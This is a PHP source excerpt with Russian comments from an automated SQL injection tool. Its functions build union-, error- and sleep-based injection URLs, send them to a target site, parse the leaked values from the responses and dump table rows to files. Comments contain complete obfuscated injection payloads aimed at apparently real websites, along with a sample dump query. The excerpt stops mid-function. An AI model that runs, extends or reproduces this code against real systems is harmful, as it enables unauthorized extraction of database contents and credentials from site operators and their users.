		//http://evilgamerz.com/downloads/index.php?zoekstring=&sortway=title&sort=f' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(0),0x217e21) /**/fRoM information_schema./**/tAbLeS /**/wHeRe /**/tAbLe_sChEmA=0x6576696c67616d65727a5f636f6d5f2d5f646233)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&page=20
		
		 $work_count = count($this->work);//рабочие поля где вывод есть
		
		 $new = array(); // Что на выходе

		 $give = 0;
		 
		 
		 if(is_array($order) AND count($pole)>1 and $order[0] !='')
			{
				$order2 = '+order+by+`'.$order[0].'`+DESC+';
               
                
			}elseif(!is_array($order) and $order !=''){
                
                $order2 = '+order+by+'.$order.'+DESC+';
            }else
			{
				$order2 = '';
			}
		     
		 
		 
		 
			//if($this->desc ==0 AND $this->desc_enable == true)
			//{
			//	$order2 = 'ORDER+by+id+DESC';
				//запрос целиком
			//}
		 
		 //подставляем колонки
		 for($col=1;$col<=$this->column;$col++)
			{
				if($col==1){$zap='';}else{$zap=',';}//запятая
			
				if(in_array($col, $this->work) AND $give==0)
				{

					$p = $col-1;

					$give++;
					
					$query .= $zap."(select+CONCAT(CHAR(".$this->charcher('ddd')."),$zapr)".'+'.$from.'+'.$where.'+'.$order2.'+limit+'.$limit." )";
					
					//$query .= $zap."(select+CONCAT(CHAR(".$this->charcher('ddd')."),$zapr)".'+'.$from.'+'.$where.'+'.$order2.'+limit+'.$limit." )";
					
				}else
				{
						
					
					$query .= $zap.$col;	
					
				}	
			}
			
			
	
				if($this->debug==true){$this->d($query,'$query mysqlGetValueCHAR');}
				//exit;
			
			
				//$url1 = $this->url.$query.'+'.$from.'+'.$where.'+'.$order.'+limit+'.$limit.''.$k;	
				$url1 = $this->url.$query.''.$k;		

				$url1 = str_replace(',,', ',',$url1);
				$url1 = str_replace('++++', '+',$url1);
				$url1 = str_replace('+++', '+',$url1);
				$url1 = str_replace('++', '+',$url1);
				
				
				
				//if($this->debug==true){$this->d($url1,'$url1 полный mysqlGetValueCHAR');}
				//exit;
				$file = $this->getContents($url1);
				
				
				
				if($this->head_enable==true){
					
					file_put_contents('./file_char_head.txt',$file);
				}else{
					
					file_put_contents('./file_char.txt',$file);
				}
				
				
				//$this->d($file,'file');
				//exit;
				
				//ищем результаты	
				if(count($pole)==1) //если он один предполагается
				{
		 		
					preg_match_all("|\[X\](.*?)\[XX\]|i",$file,$arr);
					
					//if(strlen($arr[1][0])>500)return false;	
					//if($this->debug==true){$this->d($arr,'arr ONE POLE CHAR');}
					
					

					if(isset($arr[1][0]))return array($pole[0]=>$arr[1][0]);
					
					return false;
		 		
				}else//если не сколько полей было
				{
		 				
					foreach ($pole as $val)
					{
			 	
						//preg_match_all("|\[{$val}\](.*?)\[{$val}\]/iS",$file,$arr);
						preg_match_all("|\[{$val}\](.*?)\[{$val}\]|i",$file,$arr);
						//if(strlen($arr[1][0])>500)return false;	
						//$this->d("~\[{$val}\](.*?)\[{$val}\]~iS",'reg ALL');
						
						
						
						//if($this->debug==true){$this->d($arr,'arr ONE ALL POLES CHAR');}
						
					
				
						if(isset($arr[1][0]))
						{
							$export[$val] = $arr[1][0];
						}else
						{
							$export[$val] = '';
						}
					}
				}
			
		//	$this->d($export,'$export');
			//exit;
			
			if(isset($export))
			{	
				return $export;
			}
			
			return false;

	}

	function mysqlGetValueIFNULL($bd,$table,$pole,$limit=0,$order=array(),$where=''){//общая функция для MYSQL 
		
		//$this->d($this->url,'$this->url');
		
		//$this->d('tochka: mysqlGetValue NACHALO');
		
		//$this->d($pole,'$table');
		
		//exit;
		
	
		
		
		if($this->method==10)
		{
			//$this->d('tochka: method==10 SLEEP mysqlGetValueSleep');
			$get = $this->mysqlGetValueSleep($bd,$table,$pole,$limit,$order,$where);
			if($get!==false)return $get;
			return false;

		}
	
		if($this->method==6)
		{
			//$this->d('tochka: method==6 mysqGetValueByErrorNewW');
			$get = $this->mysqGetValueByErrorNew($bd,$table,$pole,$limit,$order,$where);;
			if($get!==false)return $get;
			return false;

		}	
	
		if($this->method==5)
		{

			//$this->d('tochka: method==5 mysqlGetByOrder');
			$get = $this->mysqlGetByOrder($bd,$table,$pole,$limit,$order,$where);
			if($get!==false)return $get;
			return false;

		}
		
		if($this->method==4)
		{
			//$this->d('tochka: method==4 mysqGetValueByError');
			$get = $this->mysqGetValueByError($bd,$table,$pole,$limit,$order,$where);;
			if($get!==false)return $get;
			return false;

		}
		
		
		//$this->d('method po umolchaniy');
		
		if($table!=='')
		{
			
			if($bd==''){
				$from = 'FROM+'.$table.'';
			}else{
				$from = 'FROM+'.$bd.'.'.$table.'';
			}
		}else{
			$from = '';
		}
		
		
		$bd =    str_replace(' ', '+',$bd);
		$table = str_replace(' ', '+',$table);
		$from =  str_replace(' ', '+',$from);
		$where = str_replace(' ', '+',$where);
		$order = str_replace(' ', '+',$order);
		
		
		$method = $this->sposob;
		
		//$this->d($method,'$method = $this->sposob');
		
		
		
		
		//начало лимита
		$limit = $limit.',1';
							
		$n = $this->variant_query[$this->sposob][$this->method][0];//начало запроса
		$k = $this->variant_query[$this->sposob][$this->method][1];//конец  запроса
		
		//$this->d($n,'начало запроса');
		//$this->d($k,'конец  запроса');
		
		//$this->d($this->column,'$this->column');
		//$this->d($this->work,'$this->work');
		
	
		$query = "1111111111111$n";//начальный запрос для НЕ sleep
		
			
	
		if(!is_array($pole))$pole = array($pole);//это как раз наш запрос version к примеру
		
		$zapr = '';//общая строка для наших полей
		 
		//обволакиваем его спец символами, чтобы патом найти можно было бы
		foreach ($pole as $key=>$val)
		{
	  	
		 	if(count($pole)==1)
			{
				//если одно поле
		 		//$zapr .= 'CHAR('.$this->charcher('[X]').')'.','.$val.',CHAR('.$this->charcher('[XX]').')';
				//	$zapr .= "IFNULL(unhex(Hex(cast($val as char))),0x20)";
				$zapr .= "IFNULL(cast($val as char),0x20)";
				
		 		
		 	}else
			{
				//если несколько найти надо
				//$zapr .= ',CHAR('.$this->charcher('['.$val.']').')'.','.$val.',CHAR('.$this->charcher('['.$val.']').')';
				
				$zapr .= "0x5e,IFNULL(cast($val as char),0x20),0x5e,";
		 	}
	  	
		}
		
		//$this->d($zapr,'final $zapr');
	  
		////http://kinoklubnichka.ru/news_view.php?news_id=2 UNION ALL SELECT (SELECT CONCAT('qvkqq',IFNULL(CAST(ACTIVE AS CHAR),' '),'jzarqt',IFNULL(CAST(AGENT_INTERVAL AS CHAR),' '),'jzarqt',IFNULL(CAST(DATE_CHECK AS CHAR),' '),'jzarqt',IFNULL(CAST(ID AS CHAR),' '),'jzarqt',IFNULL(CAST(IS_PERIOD AS CHAR),' '),'jzarqt',IFNULL(CAST(LAST_EXEC AS CHAR),' '),'jzarqt',IFNULL(CAST(MODULE_ID AS CHAR),' '),'jzarqt',IFNULL(CAST(NAME AS CHAR),' '),'jzarqt',IFNULL(CAST(NEXT_EXEC AS CHAR),' '),'jzarqt',IFNULL(CAST(SORT AS CHAR),' '),'jzarqt',IFNULL(CAST(USER_ID AS CHAR),' '),'qjzzq') FROM u35491_2.b_agent LIMIT 2,1)-- -
	
	  
	  
		//http://evilgamerz.com/downloads/index.php?zoekstring=&sortway=title&sort=f' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(0),0x217e21) /**/fRoM information_schema./**/tAbLeS /**/wHeRe /**/tAbLe_sChEmA=0x6576696c67616d65727a5f636f6d5f2d5f646233)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&page=20
		
		 $work_count = count($this->work);//рабочие поля где вывод есть
		
		 $new = array(); // Что на выходе

		 $give = 0;
		 
		 
		 if(is_array($order) AND count($pole)>1 and $order[0] !='')
			{
				$order2 = '+order+by+`'.$order[0].'`+DESC+';
               
                
			}elseif(!is_array($order) and $order !=''){
                
                $order2 = '+order+by+'.$order.'+DESC+';
            }else
			{
				$order2 = '';
			}
		 
		 
			//if($this->desc ==0 AND $this->desc_enable == true)
			//{
				//$order2 = 'ORDER+by+id+DESC';
				//запрос целиком
			//}
		 
		 //подставляем колонки
		 for($col=1;$col<=$this->column;$col++)
			{
				if($col==1){$zap='';}else{$zap=',';}//запятая
			
				if(in_array($col, $this->work) AND $give==0)
				{

					$p = $col-1;

					$give++;
					
					
					$hh = $this->strtohex('[ddd]');
					
					$query .= $zap."(select+CONCAT($hh,$zapr,$hh)".'+'.$from.'+'.$where.'+'.$order2.'+limit+'.$limit.')';
					
					
					
				}else
				{
						
					
					$query .= $zap.$col;	
					
				}		
					
					
					//$this->d($query,'$query');
					//$query .= $zap."(select+CONCAT(CHAR(".$this->charcher('ddd')."),$zapr)".'+'.$from.'+'.$where.'+'.$order2.'+limit+'.$limit." )";
					
					//$query .= $zap."(select+CONCAT(CHAR(".$this->charcher('ddd')."),$zapr)".'+'.$from.'+'.$where.'+'.$order2.'+limit+'.$limit." )";
					
				//}else
				//{
						
					//if(is_array($order) AND count($pole)>1)
					//{
					//	$query .= $zap."".$order[0];
					//}else
					//{
						//$query .= $zap.$col;	
					//}
				//}	
			}
			
			
	
				if($this->debug==true){$this->d($query,'$query mysqlGetValueISNULL');}
				//exit;
			
			
				//$url1 = $this->url.$query.'+'.$from.'+'.$where.'+'.$order.'+limit+'.$limit.''.$k;	
				$url1 = $this->url.$query.''.$k;		

				$url1 = str_replace(',,', ',',$url1);
				$url1 = str_replace('++++', '+',$url1);
				$url1 = str_replace('+++', '+',$url1);
				$url1 = str_replace('++', '+',$url1);
				
				
				
				//if($this->debug==true){$this->d($url1,'$url1 полный mysqlGetValueCHAR');}
				//exit;
				$file = $this->getContents($url1);
				
				
				
				if($this->head_enable==true){
					
					file_put_contents('./file_IFNULL_head.txt',$file);
				}else{
					
					file_put_contents('./file_IFNULL.txt',$file);
				}
				
				
				//$this->d($file,'file');
				//exit;
				
							
				//ищем результаты	
				if(count($pole)==1) //если он один предполагается
				{
		 		
					//preg_match_all("/\[X\](.*?)\[XX\]/is",$file,$arr);
					
					preg_match_all("|\[ddd\](.*?)\[ddd\]|i",$file,$arr);
					//preg_match("|\[ddd\](.*?)\[ddd\]|i",$file,$arr);
					
					
					//$this->d($arr,'arr ONE POLE HEX');
					
					//if(strlen($arr[1][0])>500)return false;	

					if(isset($arr[1][0]))return array($pole[0]=>$arr[1][0]);
					
					return false;
		 		
				}else//если не сколько полей было
				{
		 				
					
			 	
						//preg_match_all("~\[{$val}\](.*?)\[{$val}\]~iS",$file,$arr);
						
						preg_match_all("|\[ddd\](.*?)\[ddd\]|i",$file,$arr);
						//preg_match("|\[ddd\](.*?)\[ddd\]|i",$file,$arr);
						
						//preg_match_all("~\^(.*?)\^~is",$arr22[0],$arr);
						
						//$this->d("~\[{$val}\](.*?)\[{$val}\]~iS",'reg ALL');
						
						//$this->d($arr,'arrA_LLL POLE HEX');
						
						
							
						
					$j=1;
					
					foreach ($pole as $val)
					{
						
						
						
						//if(strlen($arr[1][0])>500)return false;	
						
				
						if(isset($arr[1][0]))
						{
							
							$arr[1][0] = str_replace('^^','^',$arr[1][0]);
							
							$b = explode('^',$arr[1][0]);
							
							$b_bew = array_filter($b, function($element) {
								return !empty($element);
							});
							
							
							//$this->d($b,'b');
							//$this->d($b_bew,'b_new');
							
							$export[$val] = $b[$j];
						}else
						{
							$export[$val] = '';
					

						}
						
						$j++;
						
					}
					
					
					
				}
			
		//	$this->d($export,'$export');
			//exit;
			
			if(isset($export))
			{	
				return $export;
			}
			
			return false;

	}

	
	
	
	function mysqlGetAllValue($bd,$table,$needle,$count=0,$order=array(),$where='',$file=false){//Получение всех результатов
		
			
		//$this->d($count,'$count1');	
		//exit;
		//$count = 3;
		if(intval($count)==0)$count = $this->mysqlGetCountInsert($bd,$table,$where);

		//$count=1;
		//$this->d($count,'$count 2!!!');	
		
		if($count >0)
		{	
			for($i=0;$i<$count;$i++)
			{
                
                $kk = $this->mysqlGetValue($bd,$table,$needle,$i,$order,$where);
				$new[] =  $kk;
                
                
                if($file !='')
                {
                    $fh = fopen($file, "a+");
  
                    $col_str = implode(';',$kk);
                    
                    fwrite($fh, trim($col_str)."\n");
                   // $this->d($kk,'$kk');
                
                    fclose($fh);
                }
                
				//$this->d($new,'new');
					//return $new;	
			}
			
			return $new;
		}else
		{
			return 0;
		}

	}
	
	
	
	
	function mysqlGetCountInsertOLD($bd,$table,$where=''){ //общая -  подсчёт записей в таблице
		
		$limit = '';
		
		if($this->method == 10){
			
			$query = "";//начальный запрос для sleep
			$k = $this->set['sleep']['coment'];
			$true = false;
			
			
			for($col=1;$col<=$this->column;$col++)
			{

				if($col==1){$zap='';}else{$zap=',';}
				
				if(in_array($col, $this->work) AND $true==false)
				{

					$p = $col-1;
						
					$query .= $zap."CONCAT(CHAR(".$this->charcher('[X]')."),count(*),CHAR(".$this->charcher('[X]')."))";
						
					$true = true;
					
				}else
				{
					$query .= $zap.$col;	
				}
			}
			
				$q = $query.' FroM '.$bd.'.'.$table.' '.$where;
				
				$q = str_replace(',,', ',',$q);
				
				//$this->d($q,'insert');
				
				$file = $this->send_sql('SEleCT '.$q,false);
					
				//print_r($file);	
			
				preg_match_all('~\[X\](.*?)\[X\]~',$file,$arr);
				
				if(!isset($arr[1][0]))false;
				return @$arr[1][0];
			
			
			
		}

		if($this->method==6){

			$qq = '(SELECT+count(*)+from+'.$bd.'.'.$table.'+'.$where.')';

			$url = $this->url.$this->get_by_error.'+or+(1,2)=(select*from(select%20name_const('.$qq.',1),name_const('.$qq.',1)+from+'.$bd.'.'.$table.'+limit+1)a)+AND+'.$this->get_by_error.'x'.$this->get_by_error.'='.$this->get_by_error.'x';
											
			$file = $this->getContents($url);


			preg_match_all("~\Duplicate column name \'(.*?)\'~",$file,$arr);
				
			return $arr[1][0];

			
		}
		
		if($this->method==5){
		
			//$count = $this->mysqlGetByOrder($bd, $table, 'count(*)',0,array(),$where);
						
			$url = $this->url.'+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+distinct+concat%280x7e%2C0x27%2Ccount(*)%2C0x27%2C0x7e%29+FROM+'.$bd.'.'.$table.'+'.$where.'+%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+1%3D1';
		
			$file = $this->getContents($url);
		
			preg_match_all("~\\'\~\'(.*?)\'\~1\' for key~",$file,$arr);

	
			return $arr[1][0];

		}
		
		if($this->method==4){
		
			$url = $this->url.'19999999999'.$this->get_by_error.'+or+(select+count(*)from(select+1+union+select+2+union+select+3)x+group+by+concat(mid((select+count(*)+from+'.$bd.'.'.$table.'+'.$where.'),1,64),floor(rand(0)*2)))+--+'.$this->get_by_error.'x'.$this->get_by_error.'='.$this->get_by_error.'x';
							
			$file = $this->getContents($url);

			preg_match_all("~\Duplicate entry \'(.*?)1\' for key~",$file,$arr);
			
			return $arr[1][0];

		}
		
		$bd =    str_replace(' ', '+',$bd);
		$where = str_replace(' ', '+',$where);
		$table = str_replace(' ', '+',$table);
		
		
		$n = $this->variant_query[$this->sposob][$this->method][0];
		$k = $this->variant_query[$this->sposob][$this->method][1];


		$query = "1111111111111$n";
		$true = false;

		for($col=1;$col<=$this->column;$col++)
		{

			if($col==1){$zap='';}else{$zap=',';}
			
			if(in_array($col, $this->work) AND $true==false)
			{

				$p = $col-1;
					
				$query .= $zap."CONCAT(CHAR(".$this->charcher('[X]')."),count(*),CHAR(".$this->charcher('[X]')."))";
					
				$true = true;
				
			}else{
				$query .= $zap."13";	
			}
		}
		
				$url1 = $this->url.$query.'+FROM+'.$bd.'.'.$table.'+'.$where.'+'.$k;
				
			if($this->debug==true){	$this->d($url1,'mysqlGetCountInsert');}

				$file = $this->getContents($url1);

				preg_match_all('~\[X\](.*?)\[X\]~',$file,$arr);
				
				
				if(!isset($arr[1][0]))false;
				return @$arr[1][0];
		
	}
	
	function mysqlGetCountInsert($bd,$table,$where=''){ //общая -  подсчёт записей в таблице
		
		$limit = '';
		
		if($this->method == 10){
			
			$query = "";//начальный запрос для sleep
			$k = $this->set['sleep']['coment'];
			$true = false;
			
			
			for($col=1;$col<=$this->column;$col++)
			{

				if($col==1){$zap='';}else{$zap=',';}
				
				if(in_array($col, $this->work) AND $true==false)
				{

					$p = $col-1;
						
					$query .= $zap."CONCAT(CHAR(".$this->charcher('[X]')."),count(*),CHAR(".$this->charcher('[X]')."))";
						
					$true = true;
					
				}else
				{
					$query .= $zap.$col;	
				}
			}
			
				$q = $query.' FroM '.$bd.'.'.$table.' '.$where;
				
				$q = str_replace(',,', ',',$q);
				
				//$this->d($q,'insert');
				
				$file = $this->send_sql('SEleCT '.$q,false);
					
				//print_r($file);	
			
				preg_match_all('/\[X\](.*?)\[X\]/',$file,$arr);
				
				if(!isset($arr[1][0]))false;
				return @$arr[1][0];
			
			
			
		}

		if($this->method==6){

			$qq = '(SELECT+count(*)+from+'.$bd.'.'.$table.'+'.$where.')';

			$url = $this->url.$this->get_by_error.'+or+(1,2)=(select*from(select%20name_const('.$qq.',1),name_const('.$qq.',1)+from+'.$bd.'.'.$table.'+limit+1)a)+AND+'.$this->get_by_error.'x'.$this->get_by_error.'='.$this->get_by_error.'x';
											
			$file = $this->getContents($url);


			preg_match_all("~\Duplicate column name \'(.*?)\'~",$file,$arr);
				
			return $arr[1][0];

			
		}
		
		if($this->method==5){
		
			//$count = $this->mysqlGetByOrder($bd, $table, 'count(*)',0,array(),$where);
						
			$url = $this->url.'+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+distinct+concat%280x7e%2C0x27%2Ccount(*)%2C0x27%2C0x7e%29+FROM+'.$bd.'.'.$table.'+'.$where.'+%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+1%3D1';
		
			$file = $this->getContents($url);
		
			preg_match_all("~\\'\~\'(.*?)\'\~1\' for key~",$file,$arr);

	
			return $arr[1][0];

		}
		
		if($this->method==4){
		
			$url = $this->url.'19999999999'.$this->get_by_error.'+or+(select+count(*)from(select+1+union+select+2+union+select+3)x+group+by+concat(mid((select+count(*)+from+'.$bd.'.'.$table.'+'.$where.'),1,64),floor(rand(0)*2)))+--+'.$this->get_by_error.'x'.$this->get_by_error.'='.$this->get_by_error.'x';
							
			$file = $this->getContents($url);

			preg_match_all("~\Duplicate entry \'(.*?)1\' for key~",$file,$arr);
			
			return $arr[1][0];

		}
		
		$bd =    str_replace(' ', '+',$bd);
		$where = str_replace(' ', '+',$where);
		$table = str_replace(' ', '+',$table);
		
		
		if($table!=='')
		{
			
			if($bd==''){
				$from = 'FROM+'.$table.'';
			}else{
				$from = 'FROM+'.$bd.'.'.$table.'';
			}
		}else{
			$from = '';
		}
		
		
		
		$n = $this->variant_query[$this->sposob][$this->method][0];
		$k = $this->variant_query[$this->sposob][$this->method][1];


		$query = "1111111111111$n";
		$true = false;

		for($col=1;$col<=$this->column;$col++)
		{

			if($col==1){$zap='';}else{$zap=',';}
			
			if(in_array($col, $this->work) AND $true==false)
			{ 

		
				//http://evilgamerz.com/downloads/index.php?zoekstring=&sortway=title&sort=f' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(0),0x217e21) /**/fRoM information_schema./**/tAbLeS /**/wHeRe /**/tAbLe_sChEmA=0x6576696c67616d65727a5f636f6d5f2d5f646233)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1&page=20
		
		
				$p = $col-1;
					
				//	$query .= $zap."(select+CONCAT(CHAR(".$this->charcher('ddd')."),$zapr)".'+'.$from.'+'.$where.'+'.$order2.'+limit+'.$limit." )";	
					
				//$query .= $zap."CONCAT(CHAR(".$this->charcher('[X]')."),count(*),CHAR(".$this->charcher('[X]')."))";
				
				//	$zapr .= "unhex(Hex(cast($val as char)))";
				
					
				$query .= $zap."(select+CONCAT(CHAR(".$this->charcher('[X]')."),count(*),CHAR(".$this->charcher('[X]')."))".'+'.$from.'+'.$where.")";		
				//$query .= $zap."(select+CONCAT(CHAR(".$this->charcher('[X]')."),CHAR(".$this->charcher('count*')."),CHAR(".$this->charcher('[X]')."))".'+'.$from.'+'.$where.")";		
				
				//'WHERE TABLE_SCHEMA='.$this->strToHex($bd).'');
					
				$true = true;
				
			}else{
				//$query .= $zap."13";
				$query .= $zap.$col;					
			}
		}
		
			if($this->debug==true){	$this->d($query,' $query mysqlGetCountInsert');}
			
				//$url1 = $this->url.$query.'+FROM+'.$bd.'.'.$table.'+'.$where.'+'.$k;
				$url1 = $this->url.$query.'+'.$k;
				$url1 = str_replace(',,', ',',$url1);
				$url1 = str_replace('+++', '+',$url1);
				//$url1 = str_replace('++', '+',$url1);
				
				//if($this->debug==true){	$this->d($url1,'mysqlGetCountInsert');}

				$file = $this->getContents($url1);

				preg_match_all('/\[X\](.*?)\[X\]/',$file,$arr);
				
				//$this->d($file,'arrr');
				if($this->debug==true){	$this->d($arr,'mysqlGetCountInsert ARR');}
				
				
				if(!isset($arr[1][0]))false;
				return @$arr[1][0];
		
	}
	
	
	
    
    
	function mysqlGetValueSleep_old($bd,$table,$pole,$limit=0,$order=array(),$where=''){
		
			if($this->method_hex ==true  AND $this->method_auto ==false){
				$data = $this->mysqlGetValueSleepHEX($bd,$table,$pole,$limit,$order,$where);
				return $data;
			}
			
			
			if($this->method_char ==true AND $this->method_auto ==false){
				$data = $this->mysqlGetValueSleepCHAR($bd,$table,$pole,$limit,$order,$where);
				return $data;
			}
			
			
			
			if($this->method_auto ==true)
			{
			
				
				
				if($this->method_hex ==true){
					
					$data = $this->mysqlGetValueSleepHEX($bd,$table,$pole,$limit,$order,$where);
				}else
				{
					
					
					if($this->method_char ==true)
					{
						$data = $this->mysqlGetValueSleepCHAR($bd,$table,$pole,$limit,$order,$where);
						
						if($data[0] !='' AND count($data)==0)
						{
							$this->method_char = true;
							return $data;
						}
						
					}
					
				
					
					
					if($data[0]=='' AND count($data)==0)
					{
						
						$data = $this->mysqlGetValueSleepHEX($bd,$table,$pole,$limit,$order,$where);
						
						
						if($data[0] =='' AND count($data)==0)
						{
							
							$data = $this->mysqlGetValueSleepCHAR($bd,$table,$pole,$limit,$order,$where);
							
							if($data[0] =='' AND count($data)==0)
							{
									
								$this->method_hex = true;
									
									
							}else{
								$this->method_char =true;
							}
							
						}else{
							$this->method_hex = true;
						}
							
						
							
					}
				}
				
				
				return $data;
			}
		
	}
	
   
    
    
    function mysqlGetValueSleep($bd,$table,$pole,$limit=0,$order=array(),$where=''){
		
			if($this->method_hex ==true  AND $this->method_auto ==false){
               
				$data = $this->mysqlGetValueSleepHEX($bd,$table,$pole,$limit,$order,$where);
                
                $out = array_keys($data); 
                
                  if(($data[0] !='' AND count($data) >0)  or trim($data[$out[0]])!='')
                    {
                       $this->method_hex = true;
                        return $data;
                
                    }
			}
			
			
			if($this->method_char ==true AND $this->method_auto ==false){
				$data = $this->mysqlGetValueSleepCHAR($bd,$table,$pole,$limit,$order,$where);
               
                
                $out = array_keys($data); 
                
                if(($data[0] !='' AND count($data) >0)  or trim($data[$out[0]])!='')
                    {
                        $this->method_char = true;
                        return $data;
                    }
                
                
				
			}
			
			
			if($this->method_ifnull ==true AND $this->method_auto ==false){
				$data = $this->mysqlGetValueSleepIFNULL($bd,$table,$pole,$limit,$order,$where);
                
                $out = array_keys($data); 
                
                 if(($data[0] !='' AND count($data) >0)  or trim($data[$out[0]])!='')
                    {
                        $this->method_ifnull=true;
                        return $data;
                
                    }
			}
			
			
			if($this->method_auto ==true)
			{
			
				
				
				if($this->method_hex ==true){
					
				    $data = $this->mysqlGetValueSleepHEX($bd,$table,$pole,$limit,$order,$where);
                    
                    return $data;
                    
				}elseif($this->method_ifnull==true)
				{
					$data = $this->mysqlGetValueSleepIFNULL($bd,$table,$pole,$limit,$order,$where);
					
					return $data;
						
					
				}else
				{
					
					
					if($this->method_char ==true)
					{
						$data = $this->mysqlGetValueSleepCHAR($bd,$table,$pole,$limit,$order,$where);
						
                      
                        return $data;

					}
					
				   
					
					
					if(($data[0]=='' AND count($data)==0) or trim($data[$out[0]])=='' )
					{
						
						$data = $this->mysqlGetValueSleepHEX($bd,$table,$pole,$limit,$order,$where);
						
                       
                        $out = array_keys($data); 
                        
                        
						
                        
						if(($data[0] =='' AND count($data)==0) or trim($data[$out[0]])=='' )
						{
							
							$data = $this->mysqlGetValueSleepCHAR($bd,$table,$pole,$limit,$order,$where);
                            
                            $out = array_keys($data);
							
                             
							if(($data[0] =='' AND count($data)==0) or trim($data[$out[0]])=='' )
							{
									$data = $this->mysqlGetValueSleepIFNULL($bd,$table,$pole,$limit,$order,$where);
									
                                    $out = array_keys($data);
                                    
									if(($data[0] =='' AND count($data)==0) or trim($data[$out[0]])=='' )
									{
										$this->method_hex = true;
									}else{
										$this->method_ifnull = true;
									}	
									
							}else{
								$this->method_char =true;
							}
							
						}else{
							$this->method_hex = true;
						}
								
					}
				}
				
				
				return $data;
			}
		
	}
	
    
    
    
	function mysqlGetValueSleepCHAR($bd,$table,$pole,$limit=0,$order=array(),$where=''){//дочерняя
		
		
		if($table!=='')
		{
			if($bd=='')
			{
				$from = 'FROM '.$table.'';
			}else
			{
				$from = 'FROM '.$bd.'.'.$table.'';
			}
		}else
		{
			$from = '';
		}
		
		 
		$method = $this->sposob;
		
		//начало лимита
		$limit = $limit.',1';
		
		$query = "";//начальный запрос для sleep
		
		$k = $this->set['sleep']['coment'];
		
		
		
		
		if(empty($k) or $k=='')
		{	
			//$this->d('tochka: emtpry(k) ');
			//return false;
		}
			 
		 if(!is_array($pole))$pole = array($pole);//это как раз наш запрос version к примеру
		
		 $zapr = '';//общая строка для наших полей
		 
		
		 
		//обволакиваем его спец символами, чтобы патом найти можно было бы
		foreach ($pole as $key=>$val)
		{
	  	
		 	if(count($pole)==1)//если одно поле
			{
		 		$zapr .= 'CHAR('.$this->charcher('[X]').')'.','.$val.',CHAR('.$this->charcher('[XX]').')';
		 		
		 	}else
			{//если несколько найти надо
		 		$zapr .= ',CHAR('.$this->charcher('['.$val.']').')'.','.$val.',CHAR('.$this->charcher('['.$val.']').')';
		 	}
		}
	  
		//$this->d('tochka: $zapr '. $zapr);
		//exit;
		
		 $work_count = count($this->work);//рабочие поля где вывод есть
		
		//$this->d($this->work,'$work_count');
		//exit;
		
		 $new = array(); // Что на выход
		 $give = 0;
		 
		
		//if($this->dumpfile==true)
		//{
			//$query = $zapr;
		//}
		//else{
		
		
		 if(is_array($order) AND count($pole)>1 and $order[0] !='')
			{
				$order2 = ' order by `'.$order[0].'` DESC ';
               
                
			}elseif(!is_array($order) and $order !=''){
                
                $order2 = ' order by '.$order.' DESC ';
            }else
			{
				$order2 = ' ';
			}
		
		 //подставляем колонки
		 for($col=1;$col<=$this->column;$col++)
			{
				
				if($col==1){$zap='';}else{$zap=',';}//запятая
			
				if(in_array($col, $this->work) AND $give==0)
				{
					$p = $col-1;

					$give++;
					$query .= $zap."(select CONCAT(CHAR(".$this->charcher('ddd')."),$zapr)".' '.$from.' '.$where.' '.$order2.' limit '.$limit." )";
					
					//$query .= $zap."CONCAT(CHAR(".$this->charcher('ddd')."),$zapr)";
					
				}else
				{
						
					
					$query .= $zap.$col;	
					
				}
					
			}
		//}	
			//$this->d($query,'$query');
			//exit;
	
				//.$from.' '.$where.$order.'limit '.$limit
				$q = $query.' ';
				$q = str_replace(',,', ',',$q);
				$q = str_replace('  ', ' ',$q);
				
			
				
				
				
				
				//$sss = $this->mysqlDumperFilter('SEleCT '.$q);
				
				$file = $this->send_sql('SEleCT '.$q,false);
				//exit;
				
				
				if($this->head_enable==true){
					
					file_put_contents('./file_sleepCHAR_head.txt',$file);
				}else{
					file_put_contents('./file_sleepCHAR.txt',$file);
				}
				
				//$this->d($q,'$q');
				
				//$this->d($file,'$file');	
				
				//$this->d('tochka: send_sql-  '.'SEleCT '.$q);
				
				
				$this->file = $file;
				
				if($this->dumpfile==true)
				{
					
					//return $file;
		
				}
				

			
				
				//ищем результаты	
				if(count($pole)==1) //если он один предполагается
				{
					preg_match_all("|\[X\](.*?)\[XX\]|i",$file,$arr);
					
					//$this->d($arr[1][0],'$arr[1][0]');

					if(isset($arr[1][0]))return array($pole[0]=>$arr[1][0]);
					
					return false;
		 		
				}else//если не сколько полей было
				{
		 				
					foreach ($pole as $val)
					{
						preg_match_all("|\[{$val}\](.*?)\[{$val}\]|i",$file,$arr);
				
						if(isset($arr[1][0]))
						{
							$export[$val] = $arr[1][0];
						}else
						{
							$export[$val] = '';
						}
					}
				}
			
			
			
				if(isset($export))
				{	
					return $export;
				}
				
				return false;
		

	}
	
	function mysqlGetValueSleepHEX($bd,$table,$pole,$limit=0,$order=array(),$where=''){//дочерняя
		
		
		if($table!=='')
		{
			if($bd=='')
			{
				$from = 'FROM '.$table.'';
			}else
			{
				$from = 'FROM '.$bd.'.'.$table.'';
			}
		}else
		{
			$from = '';
		}
		
		 
		$method = $this->sposob;
		
		//начало лимита
		$limit = $limit.',1';
		
		$query = "";//начальный запрос для sleep
		
		$k = $this->set['sleep']['coment'];
		
		
		
		
